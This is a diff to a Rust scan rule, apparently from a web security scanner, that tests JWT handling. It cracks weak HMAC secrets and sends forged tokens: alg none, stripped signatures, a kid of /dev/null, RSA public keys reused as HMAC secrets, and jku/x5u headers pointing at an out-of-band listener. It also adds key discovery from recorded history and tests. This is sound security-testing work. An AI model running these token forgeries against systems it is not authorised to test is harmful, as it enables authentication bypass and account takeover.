@@ -2,7 +2,8 @@
 //! themselves run once per origin, token place and algorithm.
 //!
 //! It finds JWTs in the base request (a header such as `Authorization: Bearer`, a cookie, a
-//! query or body parameter) and:
+//! query or body parameter), also behind the auth placeholders a request recorded with
+//! `--auth` carries (`«auth:NAME:token»`, a cookie's or a header's), and:
 //!
 //! - cracks an HMAC signature (HS256/384/512) against a list of common secrets, offline:
 //!   nothing is sent;
@@ -14,14 +15,18 @@
 //! - then sends forged tokens, each judged accepted when its answer matches the real token's
 //!   and differs from the one without a token: a changed signature, `alg: none`, no signature, an
 //!   expired token (only once the secret is known), a `kid` pointing at `/dev/null` signed
-//!   with an empty key, the site's own RSA public key used as an HMAC secret (taken from its
-//!   JWKS), and a `jku`/`x5u` header naming the OOB listener (needs `oob start`).
+//!   with an empty key, the site's own RSA public key used as an HMAC secret (from PEM keys
+//!   in its recorded responses, key files history names or links to, its JWKS, or common key
+//!   paths), and a `jku`/`x5u` header naming the OOB listener (needs `oob start`).
 //!
 //! The payload is never changed except for `exp` in the expiry test, so a forged token
 //! claims the same identity as the real one. With `--auth`, the session leaves the token's
-//! header, cookie or parameter as the rule set it. A token the auth profile puts on itself is
-//! a placeholder the client fills in, so the rule doesn't see it: scan a recorded request that
-//! carries the token instead.
+//! header, cookie or parameter as the rule set it.
+//!
+//! A token behind a placeholder is read from the project's session values (as the client
+//! fills it in), and the requests on record keep the placeholder for the real token. Its
+//! signature is a secret: forged tokens never carry it (the changed-signature and `jku`/`x5u`
+//! tests use a made-up one) and a weak-secret finding doesn't quote the token.
 //!
 //! Attack ideas follow the SasanLabs OWASP ZAP JWT add-on (Apache License 2.0) and the
 //! WSTG's JWT testing guide; nothing is ported from them.
@@ -174,6 +179,10 @@ const SECRETS: &str = include_str!("data/jwt-secrets.txt");
 /// A JWT in three parts (the signature may be empty).
 static TOKEN: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r"eyJ[A-Za-z0-9_-]{4,}\.eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*").unwrap());
+
+/// An auth placeholder for a session value bound to one header: the token, a cookie, a header.
+static SESSION_PLACEHOLDER: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"«auth:[^:»\s]+:(?:token|cookie:[^»\s]+|header:[^»\s]+)»").unwrap());
 
 /// A token split into its parts, with its header and payload decoded.
 #[derive(Debug, Clone)]
@@ -339,6 +348,140 @@ pub(super) fn rsa_pems(jwk: &Map<String, Value>) -> Vec<String> {
     out
 }
 
+/// Paths where an origin's public signing key often is, tried after the key files its history
+/// names. A site that answers any path with its app page gives no key there, just a request.
+const KEY_PATHS: &[&str] = &[
+    "/.well-known/jwks.json",
+    "/jwks.json",
+    "/.well-known/openid-configuration",
+    "/jwt.pub",
+    "/public.pem",
+    "/publickey.pem",
+];
+/// Requests the key search sends at most, per origin, token place and algorithm.
+const KEY_REQUESTS: usize = 8;
+/// Key files from history fetched at most (before the common paths).
+const HISTORY_KEY_FILES: usize = 3;
+/// Keys tried at most (each in up to four PEM forms).
+const MAX_KEYS: usize = 4;
+
+/// A public key to try as an HMAC secret.
+struct PublicKey {
+    /// Where it was found, for the finding.
+    source: String,
+    kid: Option<String>,
+    /// The forms of it a server might have read, as text.
+    pems: Vec<String>,
+}
+
+fn add_key(keys: &mut Vec<PublicKey>, key: PublicKey) {
+    if !keys.iter().any(|k| k.pems.first() == key.pems.first()) && !key.pems.is_empty() {
+        keys.push(key);
+    }
+}
+
+/// A PEM public key, as a file holds it or as a JSON string escapes it.
+static PEM: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r"-----BEGIN ((?:RSA )?PUBLIC KEY)-----(?:[A-Za-z0-9+/=\s]|\\[rn]|\\/)+-----END ((?:RSA )?PUBLIC KEY)-----",
+    )
+    .unwrap()
+});
+
+/// A link to a key file: `href` or `src` naming a `.pem` or `.pub`.
+static KEY_LINK: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r#"(?i)(?:href|src)\s*=\s*["']([^"'#?<>\s]+\.(?:pem|pub))["']"#).unwrap());
+
+/// The PEM public keys in `text`, each in the forms a server may have read the file in: as
+/// found (without a final newline) and with one.
+fn pems_in(text: &str) -> Vec<Vec<String>> {
+    let mut out: Vec<Vec<String>> = Vec::new();
+    for m in PEM.find_iter(text) {
+        let pem = m.as_str().replace("\\r\\n", "\n").replace("\\n", "\n").replace("\\/", "/").replace("\r\n", "\n");
+        let pem = pem.trim_end().to_string();
+        let forms = vec![pem.clone(), format!("{pem}\n")];
+        if !out.contains(&forms) {
+            out.push(forms);
+        }
+    }
+    out
+}
+
+/// What the project's history holds of an origin's public keys.
+#[derive(Default)]
+struct RecordedKeys {
+    /// PEM keys in its recorded responses.
+    pems: Vec<PublicKey>,
+    /// Key files it requested or linked to (`.pem`, `.pub`), at most [`HISTORY_KEY_FILES`].
+    paths: Vec<String>,
+}
+
+/// Reads `target`'s public keys from the project's history, read-only: the scan's recorder
+/// writes to the project meanwhile.
+fn recorded_keys(project: &std::path::Path, target: &crate::http::Target) -> rusqlite::Result<RecordedKeys> {
+    use rusqlite::OpenFlags;
+    let conn = rusqlite::Connection::open_with_flags(project, OpenFlags::SQLITE_OPEN_READ_ONLY)?;
+    conn.busy_timeout(std::time::Duration::from_secs(2))?;
+    let at = rusqlite::params![target.scheme, target.host, target.port];
+    let mut out = RecordedKeys::default();
+    // Keys in bodies, and links to key files, found through the full-text index.
+    let mut st = conn.prepare(
+        "SELECT h.id, h.path, h.resp_body_text FROM history_fts JOIN history h ON h.id = history_fts.rowid
+         WHERE history_fts MATCH ?4 AND h.scheme = ?1 AND h.host = ?2 AND h.port = ?3
+         ORDER BY h.id DESC LIMIT 20",
+    )?;
+    for query in ["resp_body_text : \"public key\"", "resp_body_text : (pem OR pub)"] {
+        let rows = st.query_map(rusqlite::params![target.scheme, target.host, target.port, query], |r| {
+            Ok((r.get::<_, i64>(0)?, r.get::<_, String>(1)?, r.get::<_, Option<String>>(2)?))
+        })?;
+        for row in rows {
+            let (id, path, Some(text)) = row? else { continue };
+            for pem in pems_in(&text) {
+                add_key(
+                    &mut out.pems,
+                    PublicKey { source: format!("the key in history {id} ({path})"), kid: None, pems: pem },
+                );
+            }
+            for link in KEY_LINK.captures_iter(&text).filter_map(|c| c.get(1)) {
+                if let Some(p) = same_origin_path(link.as_str(), &path, &target.origin()) {
+                    if !out.paths.contains(&p) {
+                        out.paths.push(p);
+                    }
+                }
+            }
+        }
+    }
+    // Key files requested before (their body may not be in the index).
+    let mut st = conn.prepare(
+        "SELECT DISTINCT path FROM history WHERE scheme = ?1 AND host = ?2 AND port = ?3
+            AND (path LIKE '%.pem' OR path LIKE '%.pub') ORDER BY id DESC LIMIT 5",
+    )?;
+    let requested: Vec<String> = st.query_map(at, |r| r.get(0))?.collect::<rusqlite::Result<_>>()?;
+    for p in requested.into_iter().rev() {
+        if !out.paths.contains(&p) {
+            out.paths.insert(0, p);
+        }
+    }
+    out.paths.truncate(HISTORY_KEY_FILES);
+    out.pems.truncate(MAX_KEYS);
+    Ok(out)
+}
+
+/// `link`, found in the page at `base` (a path), as a path on `origin`; None for another origin.
+fn same_origin_path(link: &str, base: &str, origin: &str) -> Option<String> {
+    let path = if let Some(rest) = link.strip_prefix(origin) {
+        rest.to_string()
+    } else if link.contains("://") || link.starts_with("//") {
+        return None;
+    } else if link.starts_with('/') {
+        link.to_string()
+    } else {
+        let dir = base.rsplit_once('/').map_or("", |(d, _)| d);
+        format!("{dir}/{}", link.trim_start_matches("./"))
+    };
+    (path.starts_with('/') && !path.split('/').any(|s| s == "..")).then_some(path)
+}
+
 /// Where the token sits in the request, for the finding and for the session to leave alone.
 fn locate(cx: &Cx, request: &[u8], token: &str) -> (String, Keep) {
     let mut keep = Keep::default();
@@ -369,6 +512,47 @@ fn locate(cx: &Cx, request: &[u8], token: &str) -> (String, Keep) {
     (label.unwrap_or_else(|| "JWT".into()), keep)
 }
 
+/// A token in the base request.
+struct Found {
+    jwt: Jwt,
+    /// The text in the request that stands for it: the token itself, or an auth placeholder.
+    from: String,
+    /// What `from` stands for: the token, or a header value holding it (`Bearer ...`).
+    value: String,
+    /// Behind a placeholder: the token is a secret the requests on record must not hold.
+    hidden: bool,
+}
+
+impl Found {
+    /// The base request with the token replaced by `token`.
+    fn request(&self, request: &[u8], token: &str) -> Vec<u8> {
+        with_token(request, &self.from, &self.value.replace(&self.jwt.raw, token))
+    }
+}
+
+/// The JWTs in the base request, each once: written in it, then behind its session placeholders.
+fn found(cx: &Cx, text: &str) -> Vec<Found> {
+    let mut out: Vec<Found> = Vec::new();
+    let mut add = |raw: &str, from: &str, value: &str, hidden: bool| {
+        if out.iter().any(|f| f.jwt.raw == raw) {
+            return;
+        }
+        if let Some(jwt) = Jwt::parse(raw) {
+            out.push(Found { jwt, from: from.to_string(), value: value.to_string(), hidden });
+        }
+    };
+    for m in TOKEN.find_iter(text) {
+        add(m.as_str(), m.as_str(), m.as_str(), false);
+    }
+    for m in SESSION_PLACEHOLDER.find_iter(text) {
+        let Some(value) = cx.session_value(m.as_str()) else { continue };
+        if let Some(t) = TOKEN.find(&value) {
+            add(t.as_str(), m.as_str(), &value, true);
+        }
+    }
+    out
+}
+
 /// The base request with every copy of `from` replaced by `to`.
 fn with_token(request: &[u8], from: &str, to: &str) -> Vec<u8> {
     let text = String::from_utf8_lossy(request).replace(from, to);
@@ -393,8 +577,10 @@ fn tries(strength: Strength) -> usize {
 struct Probe<'a> {
     cx: &'a Cx,
     request: &'a [u8],
+    found: &'a Found,
     jwt: &'a Jwt,
-    keep: Keep,
+    /// What the session leaves alone; it grows by the cookies answers to forged tokens set.
+    keep: std::sync::Mutex<Keep>,
     place: String,
     real: Response,
     /// The answer without the token.
@@ -407,68 +593,124 @@ impl Probe<'_> {
         if self.cx.stopped() {
             return None;
         }
-        let resp = self.cx.send_keeping(with_token(self.request, &self.jwt.raw, forged), &self.keep).await.ok()?;
+        let resp = self.send(self.found.request(self.request, forged)).await.ok()?;
         (same(&resp, &self.real) && !same(&resp, &self.absent)).then_some(resp)
+    }
+
+    /// Sends a request with a forged token. A cookie its answer sets to a token (an accepted
+    /// forged one, handed back) is kept off the later requests: with `--auth` the session
+    /// would learn it and send it with every forged token after, and a server that reads the
+    /// cookie first would judge that one instead.
+    async fn send(&self, request: Vec<u8>) -> crate::error::Result<Response> {
+        let keep = self.keep.lock().expect("the keep lock is never held across a panic").clone();
+        let resp = self.cx.send_keeping(request, &keep).await?;
+        let set: Vec<String> = resp
+            .headers_named("set-cookie")
+            .filter_map(|v| v.split(';').next()?.split_once('='))
+            .filter(|(_, v)| TOKEN.is_match(v))
+            .map(|(k, _)| k.trim().to_string())
+            .collect();
+        if !set.is_empty() {
+            let mut keep = self.keep.lock().expect("the keep lock is never held across a panic");
+            for name in set {
+                if !keep.cookies.contains(&name) {
+                    keep.cookies.push(name);
+                }
+            }
+        }
+        Ok(resp)
     }
 
     fn report(&self, def: &'static AlertDef, forged: &str, other: String, resp: &Response) {
         self.cx.report(def.raise(self.place.clone(), "").attack(forged.to_string()).other_info(other), resp);
     }
 
-    /// Public RSA keys the origin publishes (JWKS, or the `jwks_uri` of its OpenID
-    /// configuration when that is on the same origin), the token's `kid` alone when it's there.
-    async fn public_keys(&self) -> Vec<Map<String, Value>> {
-        let origin = self.cx.target().origin();
-        let host = self.cx.target().host_header();
-        let mut paths: Vec<String> =
-            ["/.well-known/jwks.json", "/jwks.json", "/.well-known/openid-configuration"].map(String::from).to_vec();
-        let mut keys = Vec::new();
+    /// Public keys of the origin, at most [`MAX_KEYS`]: PEM keys in responses recorded from it
+    /// (no request), then what [`KEY_REQUESTS`] requests find at the key files its history
+    /// names or links to, its JWKS (or the same-origin `jwks_uri` of its OpenID configuration)
+    /// and common key file paths. JWKS keys are the token's `kid` alone when it's there.
+    async fn public_keys(&self) -> Vec<PublicKey> {
+        let target = self.cx.target().clone();
+        let origin = target.origin();
+        let host = target.host_header();
+        let project = self.cx.project().to_path_buf();
+        let recorded = tokio::task::spawn_blocking(move || recorded_keys(&project, &target).unwrap_or_default())
+            .await
+            .unwrap_or_default();
+        let mut keys: Vec<PublicKey> = recorded.pems;
+        let mut paths: Vec<String> = recorded.paths;
+        for p in KEY_PATHS {
+            if !paths.iter().any(|q| q == p) {
+                paths.push((*p).to_string());
+            }
+        }
         let mut i = 0;
-        while i < paths.len() && i < 4 && keys.is_empty() && !self.cx.stopped() {
+        while i < paths.len() && i < KEY_REQUESTS && keys.len() < MAX_KEYS && !self.cx.stopped() {
             let path = paths[i].clone();
             i += 1;
-            let req = format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nAccept: application/json\r\n\r\n");
+            let req = format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nAccept: */*\r\n\r\n");
             let Ok(resp) = self.cx.send(req.into_bytes()).await else { continue };
-            let Ok(json) = serde_json::from_slice::<Value>(&resp.body) else { continue };
             if resp.status != 200 {
                 continue;
             }
-            // The scope guard would refuse another origin anyway.
+            let text = String::from_utf8_lossy(&resp.body);
+            for pem in pems_in(&text) {
+                add_key(&mut keys, PublicKey { source: format!("the key file at {path}"), kid: None, pems: pem });
+            }
+            let Ok(json) = serde_json::from_slice::<Value>(&resp.body) else { continue };
+            // The scope guard would refuse another origin anyway. Fetched next.
             if let Some(rest) = json.get("jwks_uri").and_then(Value::as_str).and_then(|u| u.strip_prefix(&origin)) {
                 if rest.starts_with('/') && !paths.iter().any(|p| p == rest) {
-                    paths.push(rest.to_string());
+                    paths.insert(i, rest.to_string());
                 }
             }
+            let mut jwks: Vec<PublicKey> = Vec::new();
             for k in json.get("keys").and_then(Value::as_array).into_iter().flatten() {
                 if let Some(m) = k.as_object().filter(|m| m.get("kty").and_then(Value::as_str) == Some("RSA")) {
-                    keys.push(m.clone());
+                    let kid = m.get("kid").and_then(Value::as_str).map(String::from);
+                    let source = format!("the published RSA public key at {path}");
+                    jwks.push(PublicKey { source, kid, pems: rsa_pems(m) });
                 }
             }
-        }
-        let kid = |k: &Map<String, Value>| k.get("kid").and_then(Value::as_str).map(String::from);
-        if let Some(want) = self.jwt.kid() {
-            if keys.iter().any(|k| kid(k).as_deref() == Some(want)) {
-                keys.retain(|k| kid(k).as_deref() == Some(want));
+            if let Some(want) = self.jwt.kid() {
+                if jwks.iter().any(|k| k.kid.as_deref() == Some(want)) {
+                    jwks.retain(|k| k.kid.as_deref() == Some(want));
+                }
+            }
+            for k in jwks {
+                add_key(&mut keys, k);
             }
         }
-        keys.truncate(3);
+        keys.truncate(MAX_KEYS);
         keys
+    }
+
+    /// A signature that isn't the token's: one bit changed, or for a hidden token (whose
+    /// signature must not go on record) a made-up one of the same length.
+    fn wrong_signature(&self) -> Vec<u8> {
+        let mut sig = if self.found.hidden {
+            (0..self.jwt.signature.len()).map(|i| (i as u8).wrapping_mul(37) ^ 0x5a).collect()
+        } else {
+            self.jwt.signature.clone()
+        };
+        match sig.last_mut() {
+            Some(b) => *b ^= 0x01,
+            None => sig.push(0x42),
+        }
+        sig
     }
 
     async fn run(&self, secret: Option<&str>) {
         let jwt = self.jwt;
         let strength = self.cx.strength();
         // A changed signature: nothing below is worth sending once this is accepted.
-        let mut sig = jwt.signature.clone();
-        match sig.last_mut() {
-            Some(b) => *b ^= 0x01,
-            None => sig.push(0x42),
-        }
-        let flipped = format!("{}.{}", jwt.signing_input(), URL_SAFE_NO_PAD.encode(&sig));
+        let flipped = format!("{}.{}", jwt.signing_input(), URL_SAFE_NO_PAD.encode(self.wrong_signature()));
         if let Some(resp) = self.accepted(&flipped).await {
-            let other = "The token was sent with one bit of its signature changed and was answered like the \
-                real token, while the request without a token was answered differently."
-                .to_string();
+            let how = if self.found.hidden { "a made-up signature" } else { "one bit of its signature changed" };
+            let other = format!(
+                "The token was sent with {how} and was answered like the real token, while the request without a \
+                 token was answered differently."
+            );
             self.report(&NOT_VERIFIED, &flipped, other, &resp);
             return;
         }
@@ -524,14 +766,14 @@ impl Probe<'_> {
         // RSA public key as an HMAC secret.
         if ["RS", "PS"].iter().any(|p| jwt.alg().starts_with(p)) {
             'keys: for key in self.public_keys().await {
-                for pem in rsa_pems(&key) {
+                for pem in &key.pems {
                     let header = header_with(jwt, &[("alg", Value::from("HS256"))]);
                     let forged = sign(hmac::HMAC_SHA256, pem.as_bytes(), &header, &jwt.payload_b64);
                     if let Some(resp) = self.accepted(&forged).await {
                         let other = format!(
-                            "The token was signed with HS256, using as the secret the origin's published RSA public \
-                             key{} in PEM form:\n{pem}",
-                            key.get("kid").and_then(Value::as_str).map(|k| format!(" (kid {k})")).unwrap_or_default()
+                            "The token was signed with HS256, using as the secret {}{} in PEM form:\n{pem}",
+                            key.source,
+                            key.kid.as_deref().map(|k| format!(" (kid {k})")).unwrap_or_default()
                         );
                         self.report(&CONFUSION, &forged, other, &resp);
                         break 'keys;
@@ -539,17 +781,18 @@ impl Probe<'_> {
                 }
             }
         }
-        // jku and x5u naming the OOB listener; the original signature is kept.
+        // jku and x5u naming the OOB listener; the original signature is kept, unless it is
+        // hidden: a server fetches the URL before it checks the signature anyway.
         for field in ["jku", "x5u"] {
             if self.cx.stopped() {
                 return;
             }
             let Some(payload) = self.cx.oob_payload() else { return };
             let header = header_with(jwt, &[(field, Value::from(payload.url.clone()))]);
-            let forged =
-                format!("{}.{}.{}", b64_json(&header), jwt.payload_b64, URL_SAFE_NO_PAD.encode(&jwt.signature));
-            let request = with_token(self.request, &jwt.raw, &forged);
-            let resp = self.cx.send_keeping(request.clone(), &self.keep).await.ok();
+            let sig = if self.found.hidden { self.wrong_signature() } else { jwt.signature.clone() };
+            let forged = format!("{}.{}.{}", b64_json(&header), jwt.payload_b64, URL_SAFE_NO_PAD.encode(sig));
+            let request = self.found.request(self.request, &forged);
+            let resp = self.send(request.clone()).await.ok();
             let finding = HEADER_URL
                 .raise(self.place.clone(), "")
                 .attack(forged)
@@ -582,26 +825,14 @@ impl ActiveRule for JwtWeaknesses {
         Box::pin(async move {
             let request = cx.base_request().to_vec();
             let text = String::from_utf8_lossy(&request).to_string();
-            let mut seen: Vec<&str> = Vec::new();
-            let tokens: Vec<Jwt> = TOKEN
-                .find_iter(&text)
-                .map(|m| m.as_str())
-                .filter(|t| {
-                    if seen.contains(t) {
-                        false
-                    } else {
-                        seen.push(t);
-                        true
-                    }
-                })
-                .filter_map(Jwt::parse)
-                .collect();
+            let tokens = found(cx, &text);
             let origin = cx.target().origin();
-            for jwt in &tokens {
+            for found in &tokens {
+                let jwt = &found.jwt;
                 if cx.stopped() {
                     return;
                 }
-                let (place, keep) = locate(cx, &request, &jwt.raw);
+                let (place, keep) = locate(cx, &request, &found.from);
                 let key = format!("100007|{origin}|{place}|{}|{}", jwt.alg(), jwt.kid().unwrap_or(""));
                 // Offline: the secret, once per origin, place and key.
                 let mut secret = None;
@@ -615,10 +846,8 @@ impl ActiveRule for JwtWeaknesses {
                                 format!("the secret \"{s}\"")
                             };
                             let other = format!("The {} signature verifies with {shown}.", jwt.alg());
-                            cx.report(
-                                WEAK_SECRET.raise(place.clone(), jwt.raw.clone()).other_info(other),
-                                cx.base_response(),
-                            );
+                            let evidence = if found.hidden { String::new() } else { jwt.raw.clone() };
+                            cx.report(WEAK_SECRET.raise(place.clone(), evidence).other_info(other), cx.base_response());
                         }
                     }
                 }
@@ -627,7 +856,7 @@ impl ActiveRule for JwtWeaknesses {
                 }
                 // Does this page depend on the token? The real token against none at all.
                 let Ok(real) = cx.send_keeping(request.clone(), &keep).await else { continue };
-                let Ok(absent) = cx.send_keeping(with_token(&request, &jwt.raw, ""), &keep).await else {
+                let Ok(absent) = cx.send_keeping(found.request(&request, ""), &keep).await else {
                     continue;
                 };
                 // A refused real token (it expired since it was recorded, say) would make every forged
@@ -635,7 +864,8 @@ impl ActiveRule for JwtWeaknesses {
                 if real.status >= 400 || same(&real, &absent) || !cx.once(&format!("{key}|attacked")) {
                     continue;
                 }
-                let probe = Probe { cx, request: &request, jwt, keep, place, real, absent };
+                let keep = std::sync::Mutex::new(keep);
+                let probe = Probe { cx, request: &request, found, jwt, keep, place, real, absent };
                 probe.run(secret.as_deref()).await;
             }
         })
@@ -702,6 +932,32 @@ mod tests {
         want.extend(pkcs1);
         assert_eq!(der_bytes, want);
         assert!(pems[2].starts_with("-----BEGIN RSA PUBLIC KEY-----"));
+    }
+
+    #[test]
+    fn finds_pem_keys_as_files_and_json_hold_them() {
+        let file =
+            "-----BEGIN RSA PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEB\nAQUAA4GNADCBiQ==\n-----END RSA PUBLIC KEY-----";
+        assert_eq!(pems_in(file), vec![vec![file.to_string(), format!("{file}\n")]]);
+        let json = serde_json::json!({ "key": file }).to_string();
+        assert!(json.contains("\\n"), "{json}");
+        assert_eq!(pems_in(&json), pems_in(file));
+        assert!(pems_in("-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----").is_empty());
+    }
+
+    #[test]
+    fn key_links_stay_on_the_origin() {
+        let o = "http://a.test";
+        assert_eq!(same_origin_path("jwt.pub", "/encryptionkeys/", o).as_deref(), Some("/encryptionkeys/jwt.pub"));
+        assert_eq!(same_origin_path("./k.pem", "/a/b.html", o).as_deref(), Some("/a/k.pem"));
+        assert_eq!(same_origin_path("/k.pem", "/a/b", o).as_deref(), Some("/k.pem"));
+        assert_eq!(same_origin_path("http://a.test/x/k.pem", "/", o).as_deref(), Some("/x/k.pem"));
+        assert_eq!(same_origin_path("https://b.test/k.pem", "/", o), None);
+        assert_eq!(same_origin_path("//b.test/k.pem", "/", o), None);
+        assert_eq!(same_origin_path("../k.pem", "/a/", o), None);
+        let page = r#"<a href="jwt.pub">jwt.pub</a> <a href="premium.key">k</a> <script src='/k.pem'>"#;
+        let links: Vec<&str> = KEY_LINK.captures_iter(page).filter_map(|c| c.get(1)).map(|m| m.as_str()).collect();
+        assert_eq!(links, ["jwt.pub", "/k.pem"]);
     }
 
     #[test]
